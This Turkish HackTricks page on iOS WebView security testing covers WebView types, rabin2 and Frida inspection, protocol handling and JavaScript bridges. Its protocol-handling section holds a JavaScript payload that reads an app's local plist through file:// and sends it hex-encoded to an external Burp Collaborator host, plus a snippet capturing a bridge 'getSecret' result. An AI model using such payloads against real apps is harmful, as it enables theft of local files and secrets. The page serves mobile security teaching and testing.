# iOS WebViews

<details>

<summary><strong>AWS hackleme becerilerinizi sıfırdan ileri seviyeye taşıyın</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile</strong>!</summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

Bu sayfanın kodu [buradan](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md) alınmıştır. Daha fazla ayrıntı için sayfayı kontrol edin.


## WebViews Türleri

WebViews, uygulamalar içinde etkileşimli web içeriği görüntülemek için kullanılır. iOS uygulamaları için farklı işlevsellikler ve güvenlik özellikleri sunan çeşitli WebViews türleri bulunmaktadır. İşte kısaca bir özet:

- **UIWebView**, iOS 12'den itibaren artık önerilmeyen bir seçenektir çünkü **JavaScript**'i devre dışı bırakma desteği olmadığından, betik enjeksiyonuna ve **Cross-Site Scripting (XSS)** saldırılarına karşı savunmasızdır.

- **WKWebView**, uygulamalara web içeriği entegre etmek için tercih edilen seçenektir ve içerik ve güvenlik özellikleri üzerinde gelişmiş kontrol sağlar. **JavaScript** varsayılan olarak etkinleştirilmiştir, ancak gerektiğinde devre dışı bırakılabilir. Ayrıca, JavaScript'in otomatik olarak pencereleri açmasını önlemek için özellikler destekler ve tüm içeriğin güvenli bir şekilde yüklenmesini sağlar. Ek olarak, **WKWebView**'ın mimarisi, ana uygulama sürecini etkileyen bellek bozulması riskini en aza indirir.

- **SFSafariViewController**, uygulamalar içinde standart bir web tarama deneyimi sunar ve okunabilir bir adres alanı, paylaşım ve gezinme düğmeleri ve içeriği Safari'de açmak için doğrudan bir bağlantı içeren belirli bir düzeniyle tanınır. **WKWebView**'in aksine, **SFSafariViewController**'da **JavaScript** devre dışı bırakılamaz ve ayrıca çerezleri ve verileri Safari ile paylaşır, böylece kullanıcının gizliliğini uygulamadan korur. App Store yönergelerine göre belirgin bir şekilde görüntülenmelidir.
```javascript
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## WebViews Yapılandırma Keşfi Özeti

### **Statik Analiz Genel Bakış**

**WebViews** yapılandırmalarını inceleme sürecinde, iki temel tür üzerinde odaklanılır: **UIWebView** ve **WKWebView**. Bu WebViews'leri bir ikili içinde tanımlamak için, belirli sınıf referansları ve başlatma yöntemlerini aramak için komutlar kullanılır.

- **UIWebView Tanımlama**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
Bu komut, ikili dosyada onunla ilgili metin dizelerini arayarak **UIWebView** örneklerini bulmaya yardımcı olur.

- **WKWebView Tanımlama**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
Benzer şekilde, **WKWebView** için bu komut, kullanımına işaret eden metin dizelerini binary dosyasında arar.

Ayrıca, bir **WKWebView**'in nasıl başlatıldığını bulmak için aşağıdaki komut çalıştırılır ve başlatma ile ilgili yöntem imzasını hedef alır:
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **JavaScript Yapılandırma Doğrulaması**

**WKWebView** için, JavaScript devre dışı bırakmanın gerekmeyene kadar en iyi uygulama olduğu vurgulanmaktadır. Derlenmiş ikili dosya, `javaScriptEnabled` özelliğinin `false` olarak ayarlandığı doğrulanır ve JavaScript'in devre dışı olduğundan emin olunur:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **Sadece Güvenli İçerik Doğrulaması**

**WKWebView**, **UIWebView** ile karşılaştırıldığında karışık içerik sorunlarını belirleme yeteneği sunar. Bu, tüm sayfa kaynaklarının güvenli bağlantılar aracılığıyla yüklenmesini sağlamak için `hasOnlySecureContent` özelliği kullanılarak kontrol edilir. Derlenmiş ikili dosyada arama aşağıdaki gibi gerçekleştirilir:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **Dinamik Analiz İpuçları**

Dinamik analiz, WebView örneklerini ve özelliklerini incelemeyi içerir. Bu amaçla `webviews_inspector.js` adlı bir betik kullanılır ve `UIWebView`, `WKWebView` ve `SFSafariViewController` örneklerini hedef alır. Bulunan örneklerle ilgili URL'ler ve JavaScript ve güvenli içerikle ilgili ayarlar gibi bilgileri kaydeder.

Yığın incelemesi, WebView örneklerini tanımlamak ve `javaScriptEnabled` ve `hasonlysecurecontent` özelliklerini kontrol etmek için `ObjC.choose()` kullanılarak gerçekleştirilebilir.

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

Komut dosyası şu şekilde çalıştırılır:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**Ana Sonuçlar**:
- WebViews örnekleri başarıyla bulunur ve incelenir.
- JavaScript etkinleştirme ve güvenli içerik ayarları doğrulanır.

Bu özet, WebView yapılandırmalarının statik ve dinamik yaklaşımlarla analiz edilmesinde yer alan kritik adımları ve komutları özetlemektedir. Özellikle JavaScript etkinleştirme ve karışık içerik tespiti gibi güvenlik özelliklerine odaklanılmaktadır.

## WebView Protokol İşleme

WebView içeriğini işlemek, özellikle `http(s)://`, `file://` ve `tel://` gibi çeşitli protokollerle uğraşırken önemli bir yönüdür. Bu protokoller, uygulamalar içinde hem uzaktan hem de yerel içeriğin yüklenmesini sağlar. Yerel içerik yüklenirken, kullanıcıların dosyanın adını veya yolunu etkilemesini ve içeriği kendileri düzenlemesini engellemek için önlemler alınması gerektiği vurgulanmaktadır.

**WebViews**, içerik yükleme için farklı yöntemler sunar. Artık kullanımdan kaldırılan **UIWebView** için `loadHTMLString:baseURL:` ve `loadData:MIMEType:textEncodingName:baseURL:` gibi yöntemler kullanılır. Öte yandan, **WKWebView** `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:` ve web içeriği için `loadRequest:` yöntemlerini kullanır. Yerel dosyaları yüklemek için genellikle `pathForResource:ofType:`, `URLForResource:withExtension:` ve `init(contentsOf:encoding:)` gibi yöntemler kullanılır. Belirli bir URL veya dizini WebView'e yüklemek için `loadFileURL:allowingReadAccessToURL:` yöntemi özellikle dikkat çekicidir ve bir dizin belirtilirse hassas verilerin ortaya çıkmasına neden olabilir.

Bu yöntemleri kaynak kodunda veya derlenmiş ikili dosyada bulmak için aşağıdaki gibi komutlar kullanılabilir:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
**Dosya erişimi** ile ilgili olarak, UIWebView evrensel olarak izin verirken, WKWebView, dosya URL'lerinden erişimi yönetmek için `allowFileAccessFromFileURLs` ve `allowUniversalAccessFromFileURLs` ayarlarını tanıtır. Her ikisi de varsayılan olarak false olarak ayarlanmıştır.

Güvenlik ayarları için **WKWebView** yapılandırmalarını incelemek için bir Frida betiği örneği sağlanmıştır:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
Son olarak, yerel dosyaları dışarıya sızdırmayı hedefleyen bir JavaScript yükü örneği, yanlış yapılandırılmış WebViews ile ilişkili potansiyel güvenlik riskini göstermektedir. Bu yük, dosya içeriğini onaltılık formata kodlar ve ardından bunları bir sunucuya ileterek WebView uygulamalarında sıkı güvenlik önlemlerinin önemini vurgular.
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## WebViews Aracılığıyla Açığa Çıkarılan Yerel Yöntemler

## iOS'ta WebView Yerel Arayüzlerini Anlama

iOS 7'den itibaren, Apple, WebView'deki JavaScript ile yerel Swift veya Objective-C nesneleri arasındaki iletişim için API'lar sağlamıştır. Bu entegrasyon, temel olarak iki yöntem aracılığıyla gerçekleştirilir:

- **JSContext**: Bir Swift veya Objective-C bloğu bir `JSContext` içinde bir tanımlayıcıya bağlandığında otomatik olarak bir JavaScript işlevi oluşturulur. Bu, JavaScript ve yerel kod arasında sorunsuz bir entegrasyon ve iletişim sağlar.
- **JSExport Protokolü**: `JSExport` protokolünü miras alarak, yerel özellikler, örnek yöntemler ve sınıf yöntemleri JavaScript'e açılabilir. Bu, JavaScript ortamında yapılan değişikliklerin yerel ortamda yansıtıldığı ve tam tersinin de geçerli olduğu anlamına gelir. Bununla birlikte, hassas verilerin bu yöntem aracılığıyla yanlışlıkla açığa çıkarılmaması önemlidir.

### Objective-C'de `JSContext`'e Erişme

Objective-C'de, bir `UIWebView` için `JSContext` aşağıdaki kod satırıyla alınabilir:
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### `WKWebView` ile İletişim

`WKWebView` için, doğrudan `JSContext` erişimi mevcut değildir. Bunun yerine, JavaScript'in yerel iletişim için `postMessage` işlevi aracılığıyla mesaj iletimi kullanılır. Bu mesajlar için işleyiciler aşağıdaki gibi ayarlanır, böylece JavaScript'in yerel uygulama ile güvenli bir şekilde etkileşimde bulunması sağlanır:
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### Etkileşim ve Test

JavaScript, bir betik mesaj işleyici tanımlayarak yerel katmanla etkileşimde bulunabilir. Bu, bir web sayfasından yerel işlevleri çağırma gibi işlemlere olanak sağlar:
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Bir yerel işlev çağrısının sonucunu yakalamak ve değiştirmek için, HTML içindeki geri çağırma işlevini geçersiz kılmak mümkündür:
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
Native taraf, JavaScript çağrısını `JavaScriptBridgeMessageHandler` sınıfında gösterildiği gibi işler. Burada, sayıların çarpılması gibi işlemlerin sonucu işlenir ve JavaScript'e gösterilmesi veya daha fazla manipülasyon için geri gönderilir:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## iOS WebViews Hata Ayıklama

([https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews) adresindeki bir öğreticiye dayalıdır.)

iOS webview'ler içindeki web içeriğini etkili bir şekilde hata ayıklamak için, `console.log()` ile gönderilen mesajlar Xcode günlüklerinde görüntülenmediği için Safari'nin geliştirici araçlarının belirli bir yapılandırması gerekmektedir. İşte ana adımlar ve gereksinimler vurgulanarak basitleştirilmiş bir kılavuz:

- **iOS Cihazında Hazırlık**: Safari Web Denetçisi, iOS cihazınızda etkinleştirilmelidir. Bunun için **Ayarlar > Safari > Gelişmiş** yolunu izleyin ve _Web Denetçisi_'ni etkinleştirin.

- **macOS Cihazında Hazırlık**: macOS geliştirme makinenizde Safari içinde geliştirici araçları etkinleştirmeniz gerekmektedir. Safari'yi başlatın, **Safari > Tercihler > Gelişmiş**e erişin ve _Geliştir menüsünü göster_ seçeneğini seçin.

- **Bağlantı ve Hata Ayıklama**: iOS cihazınızı macOS bilgisayarınıza bağladıktan ve uygulamanızı başlattıktan sonra, macOS cihazınızdaki Safari'yi kullanarak hata ayıklamak istediğiniz webview'i seçin. Safari'nin menü çubuğunda _Geliştir_ bölümüne gidin, iOS cihazınızın adının üzerine gelerek webview örneklerinin listesini görmek için üzerine gelin ve incelemek istediğiniz örneği seçin. Bu amaçla yeni bir Safari Web Denetçisi penceresi açılacaktır.

Ancak, sınırlamaları dikkate alın:

- Bu yöntemle hata ayıklama yapmak için bir macOS cihazına ihtiyaç vardır çünkü Safari'ye dayanır.
- Bu yöntemle sadece Xcode aracılığıyla cihazınıza yüklenen uygulamalardaki webview'ler hata ayıklanabilir. App Store veya Apple Configurator aracılığıyla yüklenen uygulamalardaki webview'ler bu şekilde hata ayıklanamaz.

## Referanslar

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşün</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile öğrenin</strong>!</summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u takip edin.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.

</details>
